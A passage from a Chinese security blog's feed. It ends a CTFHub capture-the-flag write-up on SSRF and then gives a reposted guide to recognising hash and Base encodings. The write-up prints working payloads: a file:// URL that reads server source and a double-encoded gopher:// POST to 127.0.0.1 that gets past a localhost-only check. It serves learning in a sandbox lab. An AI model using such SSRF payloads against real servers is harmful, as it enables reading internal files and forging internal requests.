<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MAXIMA"><figure class="iseeu highlight /maxima"><table><tr><td class="code"><pre><span class="line"><span class="built_in">key</span>=11e053e2b7900523ac51fc7606b964e2</span><br><span class="line">//<span class="built_in">key</span>是不定的哈，不要全<span class="built_in">copy</span></span><br></pre></td></tr></table></figure></div>

<p>我们把<code>key</code>值输入框中试试</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220925222739689.png" alt="image-20220925222739689"></p>
<p>看来只能从本地<code>127.0.0.1</code>访问</p>
<p>利用<code>file://</code>伪协议从本地方式访问文件看看<code>index.php</code>文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>challenge-<span class="number">177</span>dcd6de76352cb.sandbox.ctfhub.com:<span class="number">10800</span><span class="regexp">/?url=file:/</span><span class="regexp">//</span>var<span class="regexp">/www/</span>html/index.php</span><br></pre></td></tr></table></figure></div>

<p>右键查看，</p>
<p>得到<code>index.php</code>源码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /?url=_&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br></pre></td></tr></table></figure></div>

<p>以相同方式看看<code>flag.php</code>文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;) &#123;</span><br><span class="line">    echo &quot;Just View From 127.0.0.1&quot;;</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$flag=getenv(&quot;CTFHUB&quot;);</span><br><span class="line">$key = md5($flag);</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&quot;key&quot;]) &amp;&amp; $_POST[&quot;key&quot;] == $key) &#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=&quot;/flag.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;key&quot;&gt;</span><br><span class="line">&lt;!-- Debug: key=&lt;?php echo $key;?&gt;--&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></div>

<p>根据<code>flag.php</code>最后的提示，</p>
<p>尝试 <code>Gopher</code> 协议向服务器发送 <code>POST</code> 包</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">Gopher协议的格式:</span><br><span class="line"></span><br><span class="line">gopher:<span class="regexp">//</span>IP:port<span class="regexp">/_TCP/</span>IP数据流</span><br></pre></td></tr></table></figure></div>

<p>先构造 <code>Gopher</code>协议所需的 <code>POST</code>请求：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/flag.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:80</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>36          </span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="language-sas"><span class="keyword">key</span>=11e053e2b7900523ac51fc7606b964e2</span></span><br><span class="line"><span class="language-sas"></span></span><br><span class="line"><span class="language-sas">//Content-<span class="keyword">Length</span> 这个要和底下POST参数[包括<span class="keyword">key</span>=,4个]长度一致</span></span><br></pre></td></tr></table></figure></div>

<p>但是这里需要对其进行两次<code>url</code>编码</p>
<p>根据<code>hint</code>，请求有<code>curl</code>功能</p>
<p>在向服务器发送请求时，首先浏览器会进行一次 <code>URL</code>解码，</p>
<p>其次服务器收到请求后，在执行<code>curl</code>功能时，进行第二次 <code>URL</code>解码</p>
<p>因此需要两次<code>url</code>编码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AUTOHOTKEY"><figure class="iseeu highlight /autohotkey"><table><tr><td class="code"><pre><span class="line">`注`：</span><br><span class="line">在第一次编码后的数据中，将`%<span class="number">0</span>A`全部替换为`%<span class="number">0</span>D%<span class="number">0</span>A`。</span><br><span class="line"></span><br><span class="line">因为 Gopher协议包含的请求数据包中，可能包含有`=`、`&amp;`等特殊字符，</span><br><span class="line">避免与服务器解析传入的参数键值对混淆，所以对数据包进行 URL编码，这样服务端会把`%`后的字节当做普通字节。</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/07/27/CTFHub-wp/image-20220925231951671.png" alt="image-20220925231951671"></p>
<p>然后第二次编码</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220925232013164.png" alt="image-20220925232013164"></p>
<p>得到</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">POST</span>%<span class="number">2520</span>%<span class="number">252</span>Fflag.php%<span class="number">2520</span>HTTP%<span class="number">252</span>F1.<span class="number">1</span>%<span class="number">250</span>D%<span class="number">250</span>AHost%<span class="number">253</span>A%<span class="number">2520127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>%<span class="number">253</span>A80%<span class="number">250</span>D%<span class="number">250</span>AContent-Length%<span class="number">253</span>A%<span class="number">252036</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">250</span>D%<span class="number">250</span>AContent-Type%<span class="number">253</span>A%<span class="number">2520</span>application%<span class="number">252</span>Fx-www-form-urlencoded%<span class="number">250</span>D%<span class="number">250</span>A%<span class="number">250</span>D%<span class="number">250</span>Akey%<span class="number">253</span>D11e053e2b7900523ac51fc7606b964e2</span><br></pre></td></tr></table></figure></div>

<p>然后又因为<code>flag.php</code>里有<code>$_SERVER[&quot;REMOTE_ADDR&quot;]</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Just View From 127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果直接在输入框，上传POST请求又会显示</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220925222739689.png" alt="image-20220925222739689"></p>
<p>这个想绕过，就只有通过<code>index.php</code>的<code>curl</code>功能，利用Gopher协议从<code>127.0.0.1</code>向目标发送<code>POST</code>请求</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PERL"><figure class="iseeu highlight /perl"><table><tr><td class="code"><pre><span class="line">?url=gopher:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">80</span>/_POST%252<span class="number">0</span>%252Fflag.php%2520HTTP%252F1.<span class="number">1</span>%250D%250AHost%253A%2520127.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>%253A8<span class="number">0</span>%250D%250AContent-Length%253A%252036%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250A%250D%250Akey%253D11e053e2b7900523ac51fc7606b964e2</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/07/27/CTFHub-wp/image-20220925232055769.png" alt="image-20220925232055769"></p>
<p>得到flag</p>
]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
  </entry>
  <entry>
    <title>加密密文特征</title>
    <url>/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/</url>
    <content><![CDATA[<p><u><a href="https://blog.51cto.com/u_15274949/2931589">原文链接</a></u></p>
<span id="more"></span>

<h2 id="1、MD5——示例"><a href="#1、MD5——示例" class="headerlink" title="1、MD5——示例"></a>1、MD5——示例</h2><p><u><strong>21232F297A57A5A743894A0E4A801FC3</strong></u></p>
<p>一般MD5值是<u>32位</u>由数字<code>0-9</code>和字母<code>a-f</code>所组成的字符串，如图。<u>如果出现这个范围以外的字符说明这可能是个错误的md5值</u>，就没必要再拿去解密了。16位值是取的是8~24位。</p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721175149372.png" alt="image-20220721175149372"></p>
<p>md5的三个特征：</p>
<p>1.<strong>确定性</strong>：一个原始数据的MD5值是唯一的，同一个原始数据不可能会计算出多个不同的MD5值。</p>
<p>2.<strong>碰撞性</strong>：<u>原始数据与其MD5值并不是一一对应的</u>，有可能多个原始数据计算出来的MD5值是一样的，这就是碰撞。</p>
<p>3.<strong>不可逆</strong>：也就是说如果告诉你一个MD5值，你是无法通过它还原出它的原始数据的，这不是你的技术不够牛，这是由它的算法所决定的。因为根据第2点，<u>一个给定的MD5值是可能对应多个原始数据的</u>，并且理论上讲是可以对应无限多个原始数据，所有无法确定到底是由哪个原始数据产生的。</p>
<h2 id="2、sha1——示例"><a href="#2、sha1——示例" class="headerlink" title="2、sha1——示例"></a>2、sha1——示例</h2><p><u><strong>d033e22ae348aeb5660fc2140aec35850c4da997</strong></u></p>
<p>这种加密的密文特征跟MD5差不多，只不过<u>位数是40</u></p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721175316568.png" alt="image-20220721175316568"></p>
<h2 id="3、HMAC算法——示例"><a href="#3、HMAC算法——示例" class="headerlink" title="3、HMAC算法——示例"></a>3、HMAC算法——示例</h2><p><u><strong>5b696ae7da9442ead7adc24d03cedb65</strong></u></p>
<p>HMAC (Hash-based Message Authentication Code) 常用于接口签名验证，这种算法就是在前两种加密的基础上引入了秘钥，而秘钥又只有传输双方才知道，所以基本上是破解不了的</p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721175340163.png" alt="image-20220721175340163"></p>
<h2 id="4、NTLM——示例"><a href="#4、NTLM——示例" class="headerlink" title="4、NTLM——示例"></a>4、NTLM——示例</h2><p><u><strong>209c6174da490caeb422f3fa5a7ae634</strong></u></p>
<p>这种加密是Windows的哈希密码，是 Windows NT 早期版本的标准安全协议。与它相同的还有Domain Cached Credentials（域哈希）。</p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721175431939.png" alt="image-20220721175431939"></p>
<h2 id="相似加密类型"><a href="#相似加密类型" class="headerlink" title="相似加密类型"></a>相似加密类型</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#    算法       长度</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">1</span> 	md5 	 <span class="number">32</span>/<span class="number">16</span></span><br><span class="line"><span class="attribute">2</span> 	sha1 	    <span class="number">40</span></span><br><span class="line"><span class="attribute">3</span> 	sha256 	    <span class="number">64</span></span><br><span class="line"><span class="attribute">4</span> 	sha512 	   <span class="number">128</span></span><br><span class="line"><span class="attribute">5</span> 	adler32 	 <span class="number">8</span></span><br><span class="line"><span class="attribute">6</span> 	crc32 	     <span class="number">8</span></span><br><span class="line"><span class="attribute">7</span> 	crc32b       <span class="number">8</span></span><br><span class="line"><span class="attribute">8</span> 	fnv132 	     <span class="number">8</span></span><br><span class="line"><span class="attribute">9</span> 	fnv164 	    <span class="number">16</span></span><br><span class="line"><span class="attribute">10</span> 	fnv1a32 	 <span class="number">8</span></span><br><span class="line"><span class="attribute">11</span> 	fnv1a64     <span class="number">16</span></span><br><span class="line"><span class="attribute">12</span> 	gost 	    <span class="number">64</span></span><br><span class="line"><span class="attribute">13</span> 	gost-crypto <span class="number">64</span></span><br><span class="line"><span class="attribute">14</span> 	haval128,<span class="number">3</span> 	<span class="number">32</span></span><br><span class="line"><span class="attribute">15</span> 	haval128,<span class="number">4</span> 	<span class="number">32</span></span><br><span class="line"><span class="attribute">16</span> 	haval128,<span class="number">5</span> 	<span class="number">32</span></span><br><span class="line"><span class="attribute">17</span> 	haval160,<span class="number">3</span> 	<span class="number">40</span></span><br><span class="line"><span class="attribute">18</span> 	haval160,<span class="number">4</span> 	<span class="number">40</span></span><br><span class="line"><span class="attribute">19</span> 	haval160,<span class="number">5</span> 	<span class="number">40</span></span><br><span class="line"><span class="attribute">20</span> 	haval192,<span class="number">3</span> 	<span class="number">48</span></span><br><span class="line"><span class="attribute">21</span> 	haval192,<span class="number">4</span> 	<span class="number">48</span></span><br><span class="line"><span class="attribute">22</span> 	haval192,<span class="number">5</span> 	<span class="number">48</span></span><br><span class="line"><span class="attribute">23</span> 	haval224,<span class="number">3</span> 	<span class="number">56</span></span><br><span class="line"><span class="attribute">24</span> 	haval224,<span class="number">4</span> 	<span class="number">56</span></span><br><span class="line"><span class="attribute">25</span> 	haval224,<span class="number">5</span> 	<span class="number">56</span></span><br><span class="line"><span class="attribute">26</span> 	haval256,<span class="number">3</span> 	<span class="number">64</span></span><br><span class="line"><span class="attribute">27</span> 	haval256,<span class="number">4</span> 	<span class="number">64</span></span><br><span class="line"><span class="attribute">28</span> 	haval256,<span class="number">5</span> 	<span class="number">64</span></span><br><span class="line"><span class="attribute">29</span> 	joaat 	     <span class="number">8</span></span><br><span class="line"><span class="attribute">30</span> 	md2          <span class="number">32</span></span><br><span class="line"><span class="attribute">31</span> 	md4 	     <span class="number">32</span></span><br><span class="line"><span class="attribute">32</span> 	ripemd128 	 <span class="number">32</span></span><br><span class="line"><span class="attribute">33</span> 	ripemd160 	 <span class="number">40</span></span><br><span class="line"><span class="attribute">34</span> 	ripemd256 	 <span class="number">64</span></span><br><span class="line"><span class="attribute">35</span> 	ripemd320 	 <span class="number">80</span></span><br><span class="line"><span class="attribute">36</span> 	sha224 	     <span class="number">56</span></span><br><span class="line"><span class="attribute">37</span> 	sha3-<span class="number">224</span> 	 <span class="number">56</span></span><br><span class="line"><span class="attribute">38</span> 	sha3-<span class="number">256</span> 	 <span class="number">64</span></span><br><span class="line"><span class="attribute">39</span> 	sha3-<span class="number">384</span> 	 <span class="number">96</span></span><br><span class="line"><span class="attribute">40</span> 	sha3-<span class="number">512</span> 	 <span class="number">128</span></span><br><span class="line"><span class="attribute">41</span> 	sha384       <span class="number">96</span></span><br><span class="line"><span class="attribute">42</span> 	sha512/<span class="number">224</span>   <span class="number">56</span></span><br><span class="line"><span class="attribute">43</span> 	sha512/<span class="number">256</span> 	 <span class="number">64</span></span><br><span class="line"><span class="attribute">44</span> 	snefru       <span class="number">64</span></span><br><span class="line"><span class="attribute">45</span> 	snefru256    <span class="number">64</span></span><br><span class="line"><span class="attribute">46</span> 	tiger128,<span class="number">3</span> 	 <span class="number">32</span></span><br><span class="line"><span class="attribute">47</span> 	tiger128,<span class="number">4</span> 	 <span class="number">32</span></span><br><span class="line"><span class="attribute">48</span> 	tiger160,<span class="number">3</span>   <span class="number">40</span></span><br><span class="line"><span class="attribute">49</span> 	tiger160,<span class="number">4</span>   <span class="number">40</span></span><br><span class="line"><span class="attribute">50</span> 	tiger192,<span class="number">3</span> 	 <span class="number">48</span></span><br><span class="line"><span class="attribute">51</span> 	tiger192,<span class="number">4</span>   <span class="number">48</span></span><br><span class="line"><span class="attribute">52</span> 	whirlpool 	 <span class="number">128</span></span><br><span class="line"><span class="attribute">53</span> 	mysql 	     老MYSQL数据库用的，<span class="number">16</span>位，且第<span class="number">1</span>位和第<span class="number">7</span>位必须为<span class="number">0</span>-<span class="number">8</span></span><br><span class="line"><span class="attribute">54</span> 	mysql5 	     <span class="number">40</span></span><br><span class="line"><span class="attribute">55</span> 	NTLM 	     <span class="number">32</span></span><br><span class="line"><span class="attribute">56</span> 	Domain Cached Credentials 	<span class="number">32</span></span><br></pre></td></tr></table></figure></div>

<h2 id="常用解密网站："><a href="#常用解密网站：" class="headerlink" title="常用解密网站："></a>常用解密网站：</h2><p><code>www.cmd5.com（带批量解密工具）</code></p>
<p><code>www.somd5.com</code></p>
<p><code>cmd5.la</code></p>
<p><code>pmd5.com</code></p>
<p><code>www.ttmd5.com（带批量解密工具）</code></p>
<hr>
<p><u>Base64、Base58、Base32、Base16、Base85、Base100等相似加密类型</u></p>
<h2 id="1、Base64——示例"><a href="#1、Base64——示例" class="headerlink" title="1、Base64——示例"></a>1、Base64——示例</h2><p><u><strong>YWRtaW4tcm9vdA==</strong></u></p>
<p>一般情况下密文尾部都会有两个等号，明文很少的时候则没有</p>
<p>Base64编码要求把3个8位字节（38=24）转化为4个6位的字节（46=24），之后在6位的前面补两个0，形成8位一个字节的形式。如果剩下的字符不足3个字节，则用0填充，输出字符使用‘=’，因此编码后输出的文本末尾可能会出现1或2个‘=’，如图。</p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721180138424.png" alt="image-20220721180138424"></p>
<p>为了保证所输出的编码位可读字符，Base64制定了一个编码表，以便进行统一转换。编码表的大小为2^6=64，这也是Base64名称的由来。</p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721180249541.png" alt="image-20220721180249541"></p>
<h3 id="Base64使用注意问题"><a href="#Base64使用注意问题" class="headerlink" title="Base64使用注意问题"></a>Base64使用注意问题</h3><h4 id="一、Base64和URL传参问题"><a href="#一、Base64和URL传参问题" class="headerlink" title="一、Base64和URL传参问题"></a>一、Base64和URL传参问题</h4><p>标准的Base64并不适合直接放在URL里传输，因为URL编码器会把标准Base64中的“/”和“+”字符变为形如“%XX”的形式，而这些“%”号在存入数据库时还需要再进行转换，因为ANSI SQL中已将“%”号用作通配符。</p>
<p>为解决此问题，可采用一种用于URL的改进Base64编码，它在末尾填充’=’号，并将标准Base64中的“+”和“/”分别改成了“-”和“_”，这样就免去了在URL编解码和数据库存储时所要作的转换，避免了编码信息长度在此过程中的增加，并统一了数据库、表单等处对象标识符的格式。</p>
<h4 id="二、Base64和URL传参问题改善"><a href="#二、Base64和URL传参问题改善" class="headerlink" title="二、Base64和URL传参问题改善"></a>二、Base64和URL传参问题改善</h4><p>另有一种用于正则表达式的改进Base64变种，它将“+”和“/”改成了“!”和“-”，因为“+”,“*”以及前面在IRCu中用到的“[”和“]”在正则表达式中都可能具有特殊含义。</p>
<p>此外还有一些变种，它们将“+/”改为“-”或“.”（用作编程语言中的标识符名称）或“.-”（用于XML中的Nmtoken）甚至“_:”（用于XML中的Name）。</p>
<h4 id="三、Base64转换后比原有的字符串长1-3"><a href="#三、Base64转换后比原有的字符串长1-3" class="headerlink" title="三、Base64转换后比原有的字符串长1/3"></a>三、Base64转换后比原有的字符串长1/3</h4><p>Base64要求把每三个8Bit的字节转换为四个6Bit的字节（38 = 46 = 24），然后把6Bit再添两位高位0，组成四个8Bit的字节，也就是说，转换后的字符串理论上将要比原来的长1/3。<br>四、Base64转换总结</p>
<p>Base64转换，最好是不要用在加密上，尤其是参数加密，很容易出问题。</p>
<h2 id="2、Base58——示例"><a href="#2、Base58——示例" class="headerlink" title="2、Base58——示例"></a>2、Base58——示例</h2><p><u><strong>6tmHCZvhgfNjQu</strong></u></p>
<p>它最大的特点是没有等号</p>
<p>Base58是用于比特币（Bitcoin）中使用的一种独特的编码方式，主要用于产生Bitcoin的钱包地址。</p>
<p>相比Base64，Base58不使用数字”0”，字母大写”O”，字母大写”I”，和字母小写”l”，以及”+“和”/“符号。</p>
<p>比特币的Base58字母表：</p>
<p>123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz</p>
<p>简单的说：Base58一种编码方式，跟十进制，十六进制一样，不过更短更省空间。</p>
<p>Base58的原理是什么？</p>
<p>二进制：0和1</p>
<p>十进制：1到10</p>
<p>十六进制：十进制的基础上加上了A-F 六个字母</p>
<p>Base58可以理解为一种58进制。</p>
<p>Base58包含了阿拉伯数字、小写英文字母，大写英文字母。</p>
<p>但是去掉了一些容易混淆的数字和字母：0（数字0）、O（o的大写字母）、l（ L的小写字母）、I（i的大写字母）</p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721180316955.png" alt="image-20220721180316955"></p>
<h2 id="3、Base32——示例"><a href="#3、Base32——示例" class="headerlink" title="3、Base32——示例"></a>3、Base32——示例</h2><p><u><strong>GEZDGNBVGY3TQOJQGE======</strong></u></p>
<p><u>他的特点是明文超过十个后面就会有很多等号</u></p>
<p>Base32使用了ASCII编码中可打印的<u>32个字符</u>(<strong>大写</strong>字母A-Z和数字2-7)对任意字节数据进行编码.Base32将串起来的二进制数据按照5个二进制位分为一组，由于传输数据的单位是字节(即8个二进制位).所以分割之前的二进制位数是40的倍数(40是5和8的最小公倍数).如果不足40位，则在编码后数据补充”=”，一个”=”相当于一个组(5个二进制位)，编码后的数据是原先的8/5倍.</p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721180354078.png" alt="image-20220721180354078"></p>
<p>Base32将任意字符串按照字节进行切分，并将每个字节对应的二进制值（不足8比特高位补0）串联起来，按照5比特一组进行切分，并将每组二进制值转换成十进制来对应32个可打印字符中的一个。</p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721180407579.png" alt="image-20220721180407579"></p>
<p>由于数据的二进制传输是按照8比特一组进行（即一个字节），因此Base32按5比特切分的二进制数据必须是40比特的倍数（5和8的最小公倍数）。例如输入单字节字符“%”，它对应的二进制值是“100101”，前面补两个0变成“00100101”（二进制值不足8比特的都要在高位加0直到8比特），从左侧开始按照5比特切分成两组：“00100”和“101”，后一组不足5比特，则在末尾填充0直到5比特，变成“00100”和“10100”，这两组二进制数分别转换成十进制数，通过上述表格即可找到其对应的可打印字符“E”和“U”，但是这里只用到两组共10比特，还差30比特达到40比特，按照5比特一组还需6组，则在末尾填充6个“=”。填充“=”符号的作用是方便一些程序的标准化运行，大多数情况下不添加也无关紧要，而且，在URL中使用时必须去掉“=”符号。</p>
<p><u>与Base64相比，Base32具有许多优点：</u></p>
<p>1.适合不区分大小写的文件系统，更利于人类口语交流或记忆。</p>
<p>2.结果可以用作文件名，因为它不包含路径分隔符 “/”等符号。</p>
<p>3.排除了视觉上容易混淆的字符，因此可以准确的人工录入。（例如，RFC4648符号集忽略了数字“1”、“8”和“0”，因为它们可能与字母“I”，“B”和“O”混淆）。</p>
<p>4.排除填充符号“=”的结果可以包含在URL中，而不编码任何字符。</p>
<p><u>Base32也比Base16有优势：</u></p>
<p><strong>·</strong>Base32比Base16占用的空间更小。（1000比特数据Base32需要200个字符，而Base16则为250个字符）</p>
<p><u>Base32的缺点：</u></p>
<p><strong>·</strong>Base32比Base64多占用大约20％的空间。因为Base32使用8个ASCII字符去编码原数据中的5个字节数据，而Base64是使用4个ASCII字符去编码原数据中的3个字节数据。</p>
<h2 id="4、Base16——示例"><a href="#4、Base16——示例" class="headerlink" title="4、Base16——示例"></a>4、Base16——示例</h2><p><u><strong>61646D696E</strong></u></p>
<p>它的特点是<u>没有等号</u>并且<u>数字要多于字母</u></p>
<p>Base16编码的方式：</p>
<p>1.将数据(根据ASCII编码，UTF-8编码等)转成对应的二进制数，不足8比特位高位补0。然后将所有的二进制全部串起来，4个二进制位为一组，转化成对应十进制数。</p>
<p>2.根据十进制数值找到Base16编码表里面对应的字符。Base16是4个比特位表示一个字符，所以原始是1个字节(8个比特位)刚好可以分成两组,也就是说原先如果使用ASCII编码后的一个字符，现在转化成两个字符。数据量是原先的2倍。</p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721193743306.png" alt="image-20220721193743306"></p>
<p>Base16编码是一个标准的十六进制字符串（注意是字符串而不是数值），更易被人类和计算机使用，因为它并不包含任何控制字符，以及Base64和Base32中的“=”符号。</p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721193802684.png" alt="image-20220721193802684"></p>
<h2 id="5、Base85——示例"><a href="#5、Base85——示例" class="headerlink" title="5、Base85——示例"></a>5、Base85——示例</h2><p><u><strong>@:X4hDWe0rkE(G[OdP4CT]N#</strong></u></p>
<p>特点是<u>奇怪的字符比较多</u>，但是很难出现等号</p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721193845924.png" alt="image-20220721193845924"></p>
<h2 id="6、Base100——示例"><a href="#6、Base100——示例" class="headerlink" title="6、Base100——示例"></a>6、Base100——示例</h2><p><u><strong>????????????????????</strong></u></p>
<p>特点就是一堆Emoji表情</p>
<p>Base100编码/解码工具（又名：Emoji表情符号编码/解码），可将文本内容编码为Emoji表情符号；同时也可以将编码后的Emoji表情符号内容解码为文本。</p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721193925524.png" alt="image-20220721193925524"></p>
<h2 id="常用解密网站：-1"><a href="#常用解密网站：-1" class="headerlink" title="常用解密网站："></a>常用解密网站：</h2><p>Base64：</p>
<p><code>tool.oschina.net</code></p>
<p><code>www.sojson.com</code></p>
<p><code>base64.us</code></p>
<p>Base58：</p>
<p><code>www.metools.info</code></p>
<p>Base32、16：</p>
<p><code>www.qqxiuzi.cn</code></p>
<p>Base100：</p>
<p><code>www.atoolbox.net</code></p>
<hr>
<h2 id="1、Unicode——汉字示例"><a href="#1、Unicode——汉字示例" class="headerlink" title="1、Unicode——汉字示例"></a>1、Unicode——汉字示例</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CAL"><figure class="iseeu highlight /cal"><table><tr><td class="code"><pre><span class="line">汉字示例&amp;<span class="string">#36825</span>（这）;、字母示例&amp;<span class="string">#116</span>（t）;、数字符号示例&amp;<span class="string">#53</span>（<span class="number">5</span>）;</span><br></pre></td></tr></table></figure></div>

<p>可以说Unicode与HTML实体编码是一个东西</p>
<p>Unicode（统一码、万国码、单一码）是一种在计算机上使用的字符编码。Unicode 是为了解决传统的字符编码方案的局限而产生的，它为每种语言中的每个字符设定了统一并且唯一的二进制编码，以满足跨语言、跨平台进行文本转换、处理的要求。1990年开始研发，1994年正式公布。</p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721194526725.png" alt="image-20220721194526725"></p>
